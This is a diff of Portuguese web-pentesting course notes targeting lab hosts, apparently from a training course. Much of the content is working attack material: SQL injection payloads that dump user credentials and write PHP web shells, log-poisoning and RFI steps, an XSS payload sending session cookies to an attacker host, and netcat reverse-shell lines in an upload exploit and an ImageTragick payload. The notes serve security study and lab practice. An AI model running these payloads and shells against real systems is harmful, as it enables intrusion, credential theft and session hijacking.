-header("Location: http://172.16.1.10/turismo/login.php")
+	fclose($file); 
 
-?>
+	header("Location: http://172.16.1.10/turismo/login.php")
+
+	?>
 
 Nota: Observar link de reset de senha para ver se o email não passou o email codificado, podendo assim trocar a codificação por outra de outro email para fazer o takeover da outra conta. Assim como o redirect que contém codificação que pode ser trocada por outra e fazer o ataque de phishing.
 
-Patch Transversal
+- Patch Transversal
 
 Falhas em diretórios com erros na aplicação, parâmetros indefinidos... Sempre observar o código fonte. É quando a aplicação permite ver o patch dos arquivos locais.
 
     http://172.16.1.10/turismo/logado.php?banners=/../../ 
 
-        Banners era um parâmetro indefinido que foi passado por parâmetro com falha 
+Banners era um parâmetro indefinido que foi passado por parâmetro com falha 
 
 
-Sql Injection
+- Sql Injection
+
+.
 
     hacker' or 1=1 limit 1;# 
 
-        Usar dentro do campo de login ou senha
+Usar dentro do campo de login ou senha
 
     hacker' and id=1 limit 1;# 
 
-        Usar dentro do campo de login ou senha
+Usar dentro do campo de login ou senha
 
 Métodos usados para fazer autenticação ou pelo menos tentar verificar se é vulnerável ou não à SQL Inj
 
@@ -3830,26 +3802,28 @@ LFI = Local File Inclusion
 
 Identificar parâmetros na aplicação com LFI, colocando /../ e verificando o comportamento do parâmetro. Quando a aplicação forçar o .php ou outra extensão no final do arquivo, basta adicionar %00 para ignorar o resto da string
 
-    Exemplos abaixo:
+Exemplos abaixo:
 
         http://172.16.1.10/turismo/info.php?p=/../../../../
 
 
-LFI -> RCE = Inserção de código no LOG
+- LFI -> RCE = Inserção de código no LOG
+
+.
 
     http://172.16.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 
 
-        Para acesso ao log injetar via nc -v 172.16.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
+Para acesso ao log injetar via nc -v 172.16.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
 
-    1. Parte Email a Reverse Shell 
+1. Parte Email a Reverse Shell 
 
         https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
 
-    2. SMTP Log Poisoning through LFI to RCE | SMTP PenTest
+2. SMTP Log Poisoning through LFI to RCE | SMTP PenTest
 
         https://youtu.be/-7sTypl3pNg
 
-    3. SMTP Log Poisoning through LFI to Remote Code Execution
+3. SMTP Log Poisoning through LFI to Remote Code Execution
 
         https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/
 
@@ -3860,58 +3834,60 @@ LFI -> RCE = Inserção de código no LOG
 
 Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /var/spool/mail/www-data&kid=ls -la
 
-└─$ telnet 172.30.0.128 25                                      
+	telnet 172.30.0.128 25                                      
 
-Trying 172.30.0.128...
+	Trying 172.30.0.128...
 
-Connected to 172.30.0.128.
+	Connected to 172.30.0.128.
 
-Escape character is '^]'.
+	Escape character is '^]'.
 
-mail from:www-data
+	mail from:www-data
 
-220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
+	220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
 
-250 2.1.0 Ok
+	250 2.1.0 Ok
 
-rcpt to:www-data@ubuntu.local
+	rcpt to:www-data@ubuntu.local
 
-250 2.1.5 Ok
+	250 2.1.5 Ok
 
-data
+	data
 
-354 End data with <CR><LF>.<CR><LF>
+	354 End data with <CR><LF>.<CR><LF>
 
-<?php system($_GET['kid']);?>                                          
+	<?php system($_GET['kid']);?>                                          
 
-. (lembrar de colocar o ponto e dar enter)
+	. (lembrar de colocar o ponto e dar enter)
 
-250 2.0.0 Ok: queued as 1C767C001F
+	250 2.0.0 Ok: queued as 1C767C001F
 
-quit
+	quit
 
-221 2.0.0 Bye
+	221 2.0.0 Bye
 
-Connection closed by foreign host.
+	Connection closed by foreign host.
 
 
-RFI: Remote File Intrusion
+- RFI: Remote File Intrusion
+
+.
 
     http://172.16.1.10/turismo/link.php?link=http://192.168.254.51:8080/injecao&kidman=ls 
 
-        Consiste em criar um servidor para pegar o redirecionamento que é feito externamente para mudar pra dentro do arquivo no servidor hacker com código malicioso assim tomando controle podendo usar comandos.
+Consiste em criar um servidor para pegar o redirecionamento que é feito externamente para mudar pra dentro do arquivo no servidor hacker com código malicioso assim tomando controle podendo usar comandos.
 
 
-HTML injection
+- HTML injection
 
 Procurar campos de formulários para a inserção de códigos HTML, podendo assim, adicionar texto, href, campos de dados...
 
     http://172.16.1.10/turismo/procurar.php?busca=%3Ch1%3EPentester%3C%2Fh1%3E
 
-        Foi inserido o código <h1>Pentester</h1> dentro do formulário. Podendo ser inserido um href para redirecionar para outra página (fake) <a href=http://192.168.254.51>DESCONTÃO</a>
+Foi inserido o código `<h1>Pentester</h1>` dentro do formulário. Podendo ser inserido um href para redirecionar para outra página (fake) `<a href=http://192.168.254.51>DESCONTÃO</a>`
 
 
-XSS Cross Site Scripting - refletido
+- XSS Cross Site Scripting - refletido
 
 Executar scripts JS dentro do campo de formulário, podendo também redirecionar para uma página fake ou roubar cookies... 
 
@@ -3919,22 +3895,22 @@ Ex.:
 
     <script>alert('Pentester')</script> 
 
-        Printa uma alert com o texto informado.
+Printa uma alert com o texto informado.
 
     <script>document.location="http://192.168.10.1"</script> 
 
-        Redirecionamento para outra página
+Redirecionamento para outra página
 
     <script>alert(document.cookies)</script>
 
-        Roubo de cookies
+Roubo de cookies
 
 
-SELF-XSS
+- SELF-XSS
 
-Injetar código na página depois de notar como a aplicação se comporta depois de colocar uma / após a extensão da página que recebe um parâmetro (/procurar.php?busca=) ficando assim (/procurar.php/). Se a página quebrar, pode testar a injeção de código JS como `...php/"><script>alert("Hakd")</script>`
+Injetar código na página depois de notar como a aplicação se comporta depois de colocar uma `/` após a extensão da página que recebe um parâmetro `/procurar.php?busca=` ficando assim `/procurar.php/`. Se a página quebrar, pode testar a injeção de código JS como `...php/"><script>alert("Hakd")</script>`
 
-Stored XSS: Sequestro de Sessão
+- Stored XSS: Sequestro de Sessão
 
 Consiste em armazenar código JS em banco de dados, através de um campo de formulário
 
@@ -3942,172 +3918,174 @@ Ao identificar este campo, pode-se abrir um serviço http via python e enviar um
 
     no server: 172.16.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 
 
-        Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie <script>alert(document.cookie="COOKIECAPT")</script>
+Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie <script>alert(document.cookie="COOKIECAPT")</script>
 
 
-Automatizando os testes: XSS
+- Automatizando os testes: XSS
 
 Ferramenta XSSSTRIKE no github. Ferramenta que faz a busca por vulnerabilidades XSS
 
     python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php?busca=" 
 
-        Faz teste no paramet
+Faz teste no paramet
 
     python3 sxxtrile.py -u "http://172.16.1.10/turismo/procurar.php" --params 
 
-        Procura por paramt
+Procura por paramt
 
     python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php/" --path 
 
-        Faz um patch transversal
+Faz um patch transversal
 
 
-URL Encode
+- URL Encode
 
 É a codificação que a url usa nos caracteres especiais ou acento. & e # deve ser passado pelo code pelo fato de ignorar os caracteres seguintes, dessa forma não se deve passar direto na URL e sim o cód correspondente.
 
-SQL Injection Error Based
+- SQL Injection Error Based
 
 Quando ao inserir um \ ou ' no final do parâmetro, retorna um erro de sintaxe do sql, nesse caso identificando o erro e podendo explorar a vulnerabilidade.
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23 
 
-        Teste sql onde o número representa a quantidade de colunas, quando não retornar mais erro, o número é a quantidade de colunas daquela tabela %23 representa o # no url encode
+Teste sql onde o número representa a quantidade de colunas, quando não retornar mais erro, o número é a quantidade de colunas daquela tabela %23 representa o # no url encode
 
     172.16.1.10/turismo/agencias.php?loja=sp' order by 1,2,3,4,5' 
 
-        Também serve para fazer o teste que é de ordenação. No lugar dos números pode se passar version() user() database() 
+Também serve para fazer o teste que é de ordenação. No lugar dos números pode se passar version() user() database() 
 
-    Ficando assim:
+Ficando assim:
 
         172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user (),database() %23
 
 
-SQLi Information Schema
+- SQLi Information Schema
 
 Fazer consulta na base information schema onde tem todas as tabelas de todos os bancos.
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables%23 
 
-        Faz a consulta no banco e traz todas as tabelas de todas as bases
+Faz a consulta no banco e traz todas as tabelas de todas as bases
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur" %23 
 
-        Faz a consulta no banco e traz as tabelas apenas da base dbmrtur
+Faz a consulta no banco e traz as tabelas apenas da base dbmrtur
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,culumn_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 
 
-        Faz a consulta de todas as colunas da base dbmrtur
+Faz a consulta de todas as colunas da base dbmrtur
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur" %23 
 
-        Faz a concatenação das tabelas para ficar fácil a adivinhação dos nomes das tabelas na hora da enumeração com o Burp e o Length(group_concat()) pra pegar o tamanho
+Faz a concatenação das tabelas para ficar fácil a adivinhação dos nomes das tabelas na hora da enumeração com o Burp e o Length(group_concat()) pra pegar o tamanho
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 
 
-        Faz a consulta das colunas da informations schema na base dbmrtur trazendo as colunas da tabela mrusers
+Faz a consulta das colunas da informations schema na base dbmrtur trazendo as colunas da tabela mrusers
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers %23 Traz nome login e senha da base bdmrtur na tabela mrusers
 
     172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,concat(login,':',senha),4,5 from mrusers %23 
 
-        Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (espaços para consulta)
+Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (espaços para consulta)
 
 
-SQLi -> RCE
+- SQLi -> RCE
 
 Fazer o carregamento de arquivos através da falha de SQL Injection error based
 
     172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23 
 
-        Ler arquivo através da falha
+Ler arquivo através da falha
 
     172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"DESEC" INTO OUTFILE "/var/www/html/turismo/banner/desec.txt" %23 
 
-        Encontrar arquivo que tenha permissão de escrita para inserir o arquivo
+Encontrar arquivo que tenha permissão de escrita para inserir o arquivo
 
     172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"<?php system($_GET['hacker']);?>" INTO OUTFILE "/var/www/html/turismo/banners/kid.php" %23 
 
-        Insere um código em PHP no diretório para usar o parâmetro e executar códigos na página
+Insere um código em PHP no diretório para usar o parâmetro e executar códigos na página
 
     172.16.1.10/turismo/banners/rce.php?hacker=ifconfig 
 
-        Usa o arquivo criado para inserir comandos
+Usa o arquivo criado para inserir comandos
 
 
-SQLi Manualmente
+- SQLi Manualmente
 
 Nota: 	Geralmente quando a página traz um id não dá pra fazer a injeção SQL usando a "aspas simples" no início pelo fato de quebrar a consulta (observar o erro), neste caso deve-se usar sem as aspas simples e usar da mesma forma como é mostrado na SQLi Information Schema. Se montar a query com as aspas simples e ele der erro de sintaxe é porque deve-se usar sem as aspas.
 
-Bypass Addslashes
+- Bypass Addslashes
 
-Quando a aplicação tem o addslashes, ela adiciona ao final de cada consulta na url uma \ Para impedir a consulta sql via URL, e nisso vai aparecer um erro de sintaxe, porém um modo de burlar essa consulta é adicionando o char(100,15,236,145) correspondente à consulta, por exemplo, ao invés de colocar table_schema="dbmrtur" Colocar table_schema=char(100,98,109,114,116,117,114)
+Quando a aplicação tem o addslashes, ela adiciona ao final de cada consulta na url uma `\` Para impedir a consulta sql via URL, e nisso vai aparecer um erro de sintaxe, porém um modo de burlar essa consulta é adicionando o `char(100,15,236,145)` correspondente à consulta, por exemplo, ao invés de colocar `table_schema="dbmrtur"` Colocar `table_schema=char(100,98,109,114,116,117,114)`
 
-SQL Injection em PostgreSQL ver SQLi Information Schema
+- SQL Injection em PostgreSQL ver SQLi Information Schema
 
-A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no union select não aceitar os números 1 2 3.. colocar null,null,null e quando for fazer o teste de string colocar 'teste' sem usar o %23. Para ver as informações do banco, usar current_database(), current_user, version(). A diferença do Mysql é que ao invés de usar where table_schema usar table_catalog='' quando for fazer a consulta das credenciais usar null,login||'-'||password| Deve usar o pipe para separar a concatenação. Host usado na aula: 172.16.1.9
+A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no `union select` não aceitar os números `1 2 3` colocar `null,null,null` e quando for fazer o teste de string colocar `'teste'` sem usar o `%23`. Para ver as informações do banco, usar `current_database()`, `current_user`, `version()`. A diferença do Mysql é que ao invés de usar `where table_schema` usar `table_catalog=''` quando for fazer a consulta das credenciais usar `null,login||'-'||password|` Deve usar o pipe para separar a concatenação. Host usado na aula: 172.16.1.9
 
 Nota: Na requisição montar com a palavra null ou o número na frente ficando null from information... ou 5 from information...
 
-Blind SQL Injection 
+- Blind SQL Injection 
 
-É fazer o teste de SQL não somente com o ' mas com o comando booleano hack' or 1=1# Ou outra lógica para dar bypass (172.16.1.5)
+É fazer o teste de SQL não somente com o `'` mas com o comando booleano `hack' or 1=1#` Ou outra lógica para dar bypass (172.16.1.5)
 
-Blind POST SQL Injection
+- Blind POST SQL Injection
 
-Usando o BIRP para testar as requisições e validar se a aplicação responde corretamente. Para dar bypass nessa vulnerabilidade deve usar os caracteres em decimal e ir perguntando para a aplicação se é verdadeiro ou não.
+Usando o BURP para testar as requisições e validar se a aplicação responde corretamente. Para dar bypass nessa vulnerabilidade deve usar os caracteres em decimal e ir perguntando para a aplicação se é verdadeiro ou não.
 
     cond_valid' and database() = char(116,117,114,105,115,109,111) # 
 
-        Pergunta o nome da base
+Pergunta o nome da base
 
     cond_valid' and length(database()) = 7 # 
 
-        Pergunta para aplicação o tamanho do nome da base de dados
+Pergunta para aplicação o tamanho do nome da base de dados
 
     cond_valid' and ascii(substring(database(),1,1)) = 100 # 
 
-        Pergunta se a primeira letra é 100 para perguntar a segunda letra basta alterar ,1,1 para ,2,1
+Pergunta se a primeira letra é 100 para perguntar a segunda letra basta alterar ,1,1 para ,2,1
 
     cond_valid' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur")# 
 
-        O numero altera de acordo com a dedução do tamanho da tabela
+O numero altera de acordo com a dedução do tamanho da tabela
 
     cond_valid' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97#  
 
-        Chutar as letras para encontrar os nomes das tabelas.
+Chutar as letras para encontrar os nomes das tabelas.
 
     cond_valid' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105# 
 
-        Chutar as colunas da tabela informada
+Chutar as colunas da tabela informada
 
     cond_valid' and ascii(substring((select login from adm limit 0,1),1,1)) = 97# 
 
-        Chutar os dados das colunas
+Chutar os dados das colunas
 
 
-Time Based SQLi
+- Time Based SQLi
 
 Baseada em tempo faz uma requisição colocando a aplicação para dar um sleep de tantos segundos, se ela demorar responder, ele é vulnerável.
 
     ' or sleep(4)# 
 
-        Verifica se a aplicação aguarda 4s
+Verifica se a aplicação aguarda 4s
 
     ' or if (length(database()) = 7 , sleep(4),0)# 
 
-        Valida o tamanho da database
+Valida o tamanho da database
 
     ' or if (database() = char(100,98,109,114,116,117,114) , sleep(4),0)# 
 
-        Adivinha os char da database
+Adivinha os char da database
 
     ' or if(ascii(substring(database(),1,1)) = 100, sleep(3),0)#
 
-        Chuta os char da database um por um
+Chuta os char da database um por um
 
 
-Automatizando os testes SQLi - SQLMap
+- Automatizando os testes SQLi - SQLMap
+
+.
 
     sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-db
 
@@ -4130,36 +4108,35 @@ Automatizando os testes SQLi - SQLMap
     sqlmap -u "172.16.1.10/turismo/turismo/login.php" --forms
 
 
-Command Injection
+- Command Injection
 
-Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é ;ls;# ponto e vírgula serve para finalizar o comando e iniciar outro e o # serve para ignorar o que vier depois ou ;cat /etc/passwd;#
+Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é `;ls;#` ponto e vírgula serve para finalizar o comando e iniciar outro e o `#` serve para ignorar o que vier depois ou `;cat /etc/passwd;#`
 
-Automatizando os Testes Command Injection - COMMIX
+- Automatizando os Testes Command Injection - COMMIX
 
-A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é POST ou não e informar o parâmetro que no caso do exemplo abaixo é site=
+A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é `POST` ou não e informar o parâmetro que no caso do exemplo abaixo é `site=`
 
     commix --url http://172.16.1.10/hosting/ --data="site=businesscorp.com.br"
 
+- Enumerando campos com Intruder
 
-Enumerando campos com Intruder
+Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link `172.16.1.10/turismo/ativar-conta.php` no parâmetro `login=`
 
-Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link 172.16.1.10/turismo/ativar-conta.php no parâmetro login=
-
-Fuzzing de Vulnerabilidade com o Burp
+- Fuzzing de Vulnerabilidade com o Burp
 
 Fazer um bruteforce no burp com uma wordlist da seclists própria de fuzzing, dessa forma encontrando uma vulnerabilidade dando bypass na aplicação
 
 Depois que interceptar a página, envia para o intruder, em Positions, limpa todas e adiciona apenas a posição que deseja. Em payload carregar a lista que precisa, no caso fuzzing na seclists. Depois adiciona em options->grep a palavra que vai identificar se deu certo ou não (resposta da aplicação), no caso Incorreto e adiciona SQL para notificar de erros SQL. Quando rodar, verificar onde não tem flag setada em incorreto e sql, pois possivelmente este será o payload correto. Para saber o payload basta selecionar e dar um send to decoder e fazer a decodificação de URL. O status possivelmente será 302 (redirecionamento) que possivelmente é o payload correto. Quando encontrar uma falha time-based enviar para o repeater e alterar o parâmetro Time e fazer o teste.. Os testes foram feitos na página de login e adm do host 172.16.1.10.
 
-Teste de LFI com BURPSUITE - Local File Inclusion
+- Teste de LFI com BURPSUITE - Local File Inclusion
 
-Fazer da mesma forma como explicado acima, porém no parâmetro sobre.php na url (GET) depois inserir o GREP "include" para saber o endereços que não deram certo, o que não estiver com o include marcado é porque foi o payload correto.
+Fazer da mesma forma como explicado acima, porém no parâmetro `sobre.php` na url (GET) depois inserir o `GREP "include"` para saber o endereços que não deram certo, o que não estiver com o include marcado é porque foi o payload correto.
 
-Personalizando regras com Intruder do Burp Suite
+- Personalizando regras com Intruder do Burp Suite
 
-Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por : se for o caso da aplicação. Em payloads Sets: Custom Interator Em Separator position: : Em payload Processing: Adicionar o tipo de encode, no exemplo base64. Host usado 172.16.1.10/logs
+Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por `:` se for o caso da aplicação. Em payloads Sets: `Custom Interator` Em Separator position: `:` Em payload Processing: Adicionar o tipo de encode, no exemplo `base64`. Host usado 172.16.1.10/logs
 
-Realizando ataques com o Intruder - Burp
+- Realizando ataques com o Intruder - Burp
 
     Tipos de Ataques: 
 
@@ -4186,64 +4163,63 @@ Realizando ataques de força bruta HYDRA
 
     hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
-        Faz um brute  force nos campos login e senha do formulário e "pressiona" o botão Login fazendo o filtro pela palavra incorreto sabendo que está com credenciais inválidas
+Faz um brute  force nos campos login e senha do formulário e "pressiona" o botão Login fazendo o filtro pela palavra incorreto sabendo que está com credenciais inválidas
 
-
-Problemas de autorização Exemplo
+- Problemas de autorização Exemplo
 
 Acessar páginas onde o usuário comum não tenha acesso.
 
-Ao fazer uso da ferramenta, caso haja algum login válido e tenha conseguido acessar algo, pegar o cookie e passar para a ferramenta fazer o brute force de diretório, na intenção de encontrar mais diretórios e páginas que eram para estar restritas usando por exemplo no gobuster o -C "colocandoocookie"
+Ao fazer uso da ferramenta, caso haja algum login válido e tenha conseguido acessar algo, pegar o cookie e passar para a ferramenta fazer o brute force de diretório, na intenção de encontrar mais diretórios e páginas que eram para estar restritas usando por exemplo no gobuster o `-C "colocandoocookie"`
 
-Exemplos: Cookies e Sessões
+- Exemplos: Cookies e Sessões
 
-Quando houver um redirecionamento forçando o navegador ir para a página correta, pode-se usar o CURL passando a página desejada de modo que ele não redirecione, a menos que use o -L. Podendo fazer o roubo do cookie, para ganhar acesso. O cookie da sessão do usuário limitado pode ser usado no curl na flag -c "cookie" Para facilitar o encontro de páginas. Para usar o curl no BURP, --proxy 127.0.0.1:8080 A requisição passará pelo burp podendo fazer o redirecionamento também. No burp, pode usar lá em options e marcar Intercept Client Requests e alterar o location para a pagina de acesso full. Para roubo de sessão, escutar em uma porta e mandar o link para o alvo, quando a vítima clicar o cookie dela será enviado para o atacante, desse modo podendo roubar a sessão da vítima.
+Quando houver um redirecionamento forçando o navegador ir para a página correta, pode-se usar o CURL passando a página desejada de modo que ele não redirecione, a menos que use o `-L`. Podendo fazer o roubo do cookie, para ganhar acesso. O cookie da sessão do usuário limitado pode ser usado no curl na flag `-c "cookie"` Para facilitar o encontro de páginas. Para usar o curl no BURP, `--proxy 127.0.0.1:8080` A requisição passará pelo burp podendo fazer o redirecionamento também. No burp, pode usar lá em options e marcar Intercept Client Requests e alterar o location para a pagina de acesso full. Para roubo de sessão, escutar em uma porta e mandar o link para o alvo, quando a vítima clicar o cookie dela será enviado para o atacante, desse modo podendo roubar a sessão da vítima.
 
-File Disclosure - LFI
+- File Disclosure - LFI
 
 Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 172.30.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.
 
-Explorando inputs de Uploads
+- Explorando inputs de Uploads
 
 Identificar na aplicação campo de upload de arquivos. 
 
     172.30.40/_old/
 
-        Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>
+Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>
 
     curl http://172.30.0.40/_old/upload/desec.php -d "hack=id" 
 
-        Pegando o ID da máquina alvo
+Pegando o ID da máquina alvo
 
     curl http://172.30.0.40/_old/upload/desec.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"
 
-        Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 
+Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 
 
 
-Bypass Upload: Extensões
+- Bypass Upload: Extensões
 
 Algumas aplicações fazem o filtro mas não fazem corretamente, se tentar fazer o upload do arquivo shell.phP ele pode aceitar, devido o último P estar maiúsculo. Subir a shell em GET ou POST e ganhar acesso ao host.
 
-Bypass Upload: .htaccess
+- Bypass Upload: .htaccess
 
-Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar como um .php todo arquivo .qqrcoisa da sua escolha. o código ficando: AddType application/x-httpd-php .sec
+Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar como um `.php` todo arquivo `.qqrcoisa` da sua escolha. o código ficando: `AddType application/x-httpd-php .sec`
 
-Bypass Upload: Tipo de conteúdo
+- Bypass Upload: Tipo de conteúdo
 
-Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo .pdf quanto pelo head %PDF-1.5 É nesse caso necessário criar o script com a extensão .php.pdf com o head %PDF-1.5. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  echo mime_content_type('desec.php.pdf');  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em http://172.16.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id Os caracteres %00 servem para ignorar a extensao .pdf  no final
+Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('desec.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://172.16.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final
 
-Bypass de Upload de Imagens
+- Bypass de Upload de Imagens
 
-Tentar as técnicas aprendidas acima, como alterar o head para GIF89a ou a extensão para .gif e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 172.30.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  
+Tentar as técnicas aprendidas acima, como alterar o head para `GIF89a` ou a extensão para `.gif` e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 172.30.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  
 
-push graphic-context
-            viewbox 0 0 640 480
-            fill 'url(https:/";nc -e /bin/bash 172.20.1.86 443")'
-            pop graphic-context
+	push graphic-context
+		    viewbox 0 0 640 480
+		    fill 'url(https:/";nc -e /bin/bash 172.20.1.86 443")'
+		    pop graphic-context
 
 e ver o comportamento da aplicação. Se positivo, pode se testar um wget na máquina do atacante ou ping ou nc reverso como no exemplo.
 
-PHP Wrappers
+- PHP Wrappers
 
 São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obter acesso aos arquivos do server nos campos de input.
 
@@ -4253,133 +4229,121 @@ São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obt
 
     index.php/data://text/plan;base64,REVTRUM= 
 
-        O comando em base64 é equivalente ao index.php?page=data://text/plan,<?php system(id);?> Pode-se fazer também uma shell em php com o comando 
+O comando em base64 é equivalente ao index.php?page=data://text/plan,<?php system(id);?> Pode-se fazer também uma shell em php com o comando 
 
             index.php?page=data://text/plan;base64,PD9waHAgc3lzdGVtKCRfR0VUWydoYWNrJ10pOyA/Pg==
 
-            OU passando diretamente o código se a aplicação aceitar index.php?page=data://text/plan,<?php system($_GET['hack']); ?>
+OU passando diretamente o código se a aplicação aceitar index.php?page=data://text/plan,<?php system($_GET['hack']); ?>
 
 
-Testando e explorando: Joomla
+- Testando e explorando: Joomla
 
 Aplicação de código aberto onde tem vários exploits públicos e várias vulnerabilidades principalmente de sql injection. Depois de fazer o mapeamento do código publico e fazer a enumeração da aplicação, verificar por ferramentas feitas especialmente para a aplicação: joomscan
 
     joomscan -u http://172.30.0.106/ 
 
-        Enumera toda a aplicação buscando por vulns 44033 CVE-2017-8917 https://www.exploit-db.com/exploits/42033
+Enumera toda a aplicação buscando por vulns 44033 CVE-2017-8917 https://www.exploit-db.com/exploits/42033
 
 
     sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
 
-        Vai trazer as tabelas
+Vai trazer as tabelas
 
 
     sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]
 
     sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]
 
-
-
     sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]
 
 
-Explorando o PHPMailer
+- Explorando o PHPMailer
 
-Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o $_GET ou o NC. Host 172.30.0.125
